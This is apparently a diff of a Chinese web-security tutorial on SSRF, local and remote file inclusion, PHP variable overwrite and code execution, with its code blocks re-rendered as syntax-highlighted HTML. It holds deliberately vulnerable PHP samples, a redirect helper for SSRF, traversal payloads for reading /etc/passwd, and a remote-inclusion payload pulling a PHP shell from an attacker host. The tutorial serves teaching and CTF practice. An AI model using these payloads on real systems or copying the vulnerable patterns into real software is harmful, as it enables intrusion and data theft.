+        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET $link HTTP/1.1\r\n"</span><span class="token punctuation">;</span> 
+        <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span> 
+        <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span> 
+        <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span> 
+        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span> 
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+            <span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">}</span> 
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段代码使用 <code>fsockopen</code> 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p>
 </li>
 <li><p><code>curl_exec()</code></p>
-<pre><code>&lt;?php 
-if (isset($_POST['url'])) {
-    $link = $_POST['url'];
-    $curlobj = curl_init();
-    curl_setopt($curlobj, CURLOPT_POST, 0);
-    curl_setopt($curlobj,CURLOPT_URL,$link);
-    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
-    $result=curl_exec($curlobj);
-    curl_close($curlobj);
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    $filename = './curled/'.rand().'.txt';
-    file_put_contents($filename, $result); 
-    echo $result;
-}
-?&gt;</code></pre><p>使用 <code>curl</code> 获取数据。</p>
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./curled/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用 <code>curl</code> 获取数据。</p>
 </li>
 </ol>
 <h2 id="阻碍-SSRF-漏洞利用的场景"><a href="#阻碍-SSRF-漏洞利用的场景" class="headerlink" title="阻碍 SSRF 漏洞利用的场景"></a>阻碍 SSRF 漏洞利用的场景</h2><ul>
@@ -896,41 +907,44 @@ if (isset($_POST['url'])) {
 </ul>
 <h2 id="利用-SSRF-进行端口扫描"><a href="#利用-SSRF-进行端口扫描" class="headerlink" title="利用 SSRF 进行端口扫描"></a>利用 SSRF 进行端口扫描</h2><p>根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。</p>
 <p>后端实现</p>
-<pre><code>&lt;?php 
-if (isset($_POST['url'])) {
-    $link = $_POST['url'];
-    $filename = './curled/'.rand().'txt';
-    $curlobj = curl_init($link);
-    $fp = fopen($filename,"w");
-    curl_setopt($curlobj, CURLOPT_FILE, $fp);
-    curl_setopt($curlobj, CURLOPT_HEADER, 0);
-    curl_exec($curlobj);
-    curl_close($curlobj);
-    fclose($fp);
-    $fp = fopen($filename,"r");
-    $result = fread($fp, filesize($filename)); 
-    fclose($fp);
-    echo $result;
-}
-?&gt;</code></pre><p>构造一个前端页面</p>
-<pre><code>&lt;html&gt;
-&lt;body&gt;
-  &lt;form name="px" method="post" action="http://127.0.0.1/ss.php"&gt;
-    &lt;input type="text" name="url" value=""&gt;
-    &lt;input type="submit" name="commit" value="submit"&gt;
-  &lt;/form&gt;
-  &lt;script&gt;&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>请求非 HTTP 的端口可以返回 banner 信息。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./curled/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'txt'</span><span class="token punctuation">;</span>
+    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FILE</span><span class="token punctuation">,</span> <span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造一个前端页面</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>px<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1/ss.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>commit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请求非 HTTP 的端口可以返回 banner 信息。</p>
 <p>或可利用 302 跳转绕过 HTTP 协议的限制。</p>
 <p>辅助脚本</p>
-<pre><code>&lt;?php
-$ip = $_GET['ip'];
-$port = $_GET['port'];
-$scheme = $_GET['s'];
-$data = $_GET['data'];
-header("Location: $scheme://$ip:$port/$data");
-?&gt;</code></pre><p><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本</a></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$scheme</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> <span class="token variable">$scheme</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//$ip:$port/$data");</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本</a></p>
 <h2 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h2><ul>
 <li><p>Dict 协议</p>
 <pre><code>dict://fuzz.wuyun.org:8080/helo:dict</code></pre></li>
@@ -988,12 +1002,13 @@ List:
 </ul>
 <p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
 <h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>本地文件包含，Local File Inclusion，LFI。</p>
-<pre><code>&lt;?php
-$file = $_GET['file'];
-if (file_exists('/home/wwwrun/'.$file.'.php')) {
-  include '/home/wwwrun/'.$file.'.php';
-}
-?&gt;</code></pre><p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'/home/wwwrun/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">include</span> <span class="token string">'/home/wwwrun/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p>
 <ul>
 <li><code>%00</code> 截断</li>
 </ul>
@@ -1007,12 +1022,13 @@ if (file_exists('/home/wwwrun/'.$file.'.php')) {
 </ul>
 <pre><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></pre><p>只适用 Windows，点号需要长于 256。</p>
 <h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>远程文件包含，Remote File Inclusion，RFI。</p>
-<pre><code>&lt;?php
-if ($route == "share") {
-  require_once $basePath . "/action/m_share.php";
-} elseif ($route == "sharelink") {
-  require_once $basePath . "/action/m_sharelink.php";
-}</code></pre><p>构造变量 <code>basePath</code> 的值。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">==</span> <span class="token string">"share"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">require_once</span> <span class="token variable">$basePath</span> <span class="token punctuation">.</span> <span class="token string">"/action/m_share.php"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">==</span> <span class="token string">"sharelink"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">require_once</span> <span class="token variable">$basePath</span> <span class="token punctuation">.</span> <span class="token string">"/action/m_sharelink.php"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造变量 <code>basePath</code> 的值。</p>
 <pre><code>/?basePath=http://attacker/phpshell.txt?</code></pre><p>最终的代码执行了</p>
 <pre><code>require_once "http://attacker/phpshell.txt?/action/m_share.php";</code></pre><p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
 <ul>
@@ -1065,54 +1081,59 @@ if ($route == "share") {
 <li>PHP CGI 路径解析</li>
 </ul>
 <p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p>
-<pre><code>location ~ \.php$ {
-  root html;
-  fastcgi_pass 127.0.0.1:9000;
-  fastcgi_index index.php;
-  fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
-  include fastcgi_param;
-}</code></pre><ul>
+<pre class="line-numbers language-php"><code class="language-php">location <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>
+  root html<span class="token punctuation">;</span>
+  fastcgi_pass <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>
+  fastcgi_index index<span class="token punctuation">.</span>php<span class="token punctuation">;</span>
+  fastcgi_param <span class="token constant">SCRIPT_FILENAME</span> <span class="token operator">/</span>scripts<span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>
+  <span class="token keyword">include</span> fastcgi_param<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
 <li>其他方式</li>
 </ul>
 <p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p>
 <h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。</p>
 <pre><code>register_globals=ON</code></pre><p>示例</p>
-<pre><code>&lt;?php
-echo "Register_globals: " . (int)ini_get("register_globals") . "&lt;br/&gt;";
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token string">"Register_globals: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
 
-if ($auth) {
-  echo "private!";
-}
-?&gt;</code></pre><p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p>
 <h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract() 变量覆盖"></a><code>extract()</code> 变量覆盖</h3><p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p>
 <pre><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</code></pre><p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p>
 <p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p>
-<pre><code>&lt;?php
-$auth = "0";
-extract($_GET);
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-if ($auth == 1) {
-  echo "private!";
-} else {
-  echo "public!";
-}
-?&gt;</code></pre><p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"public!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
 <h3 id="import-request-variables-变量覆盖"><a href="#import-request-variables-变量覆盖" class="headerlink" title="import_request_variables 变量覆盖"></a><code>import_request_variables</code> 变量覆盖</h3><pre><code>bool import_request_variables (string $types [, string $prefix])</code></pre><p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p>
-<pre><code>&lt;?php
-$auth = "0";
-import_request_variables("G");
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>
+<span class="token function">import_request_variables</span><span class="token punctuation">(</span><span class="token string">"G"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-if ($auth == 1) {
-  echo "private!";
-} else {
-  echo "public!";
-}
-?&gt;</code></pre><p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"public!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p>
 <h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str() 变量覆盖"></a><code>parse_str()</code> 变量覆盖</h3><pre><code>void parse_str ( string $str [, array &amp;$arr ])</code></pre><p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p>
-<pre><code>// var.php?var=new  变量覆盖
-$var = "init";
-parse_str($_SERVER["QUERY_STRING"]);
-print $var;</code></pre><p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// var.php?var=new  变量覆盖</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"init"</span><span class="token punctuation">;</span>
+<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p>
 <h2 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h3><p>PHP 中有不少可以直接执行代码的函数。</p>
 <pre><code>eval();
 assert();
@@ -1123,47 +1144,51 @@ passthru();
 escapeshellcmd();
 pcntl_exec();
 ......</code></pre><h3 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace() 代码执行"></a><code>preg_replace()</code> 代码执行</h3><p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p>
-<pre><code>&lt;?php
-$var = "&lt;tag&gt;phpinfo()&lt;/tag&gt;";
-preg_replace("/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e", "addslashes(\\1)", $var);
-?&gt;</code></pre><p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"&lt;tag>phpinfo()&lt;/tag>"</span><span class="token punctuation">;</span>
+<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;tag>(.*?)&lt;\/tag>/e"</span><span class="token punctuation">,</span> <span class="token string">"addslashes(\\1)"</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p>
 <h3 id="preg-match-代码执行"><a href="#preg-match-代码执行" class="headerlink" title="preg_match 代码执行"></a><code>preg_match</code> 代码执行</h3><p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p>
-<pre><code>&lt;?php
-include 'flag.php';
-if(isset($_GET['code'])){
-    $code = $_GET['code'];
-    if(strlen($code)&gt;40){
-        die("Long.");
-    }
-    if(preg_match("/[A-Za-z0-9]+/",$code)){
-        die("NO.");
-    }
-    @eval($code);
-}else{
-    highlight_file(__FILE__);
-}
-//$hint =  "php function getFlag() to get flag";
-?&gt;</code></pre><p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
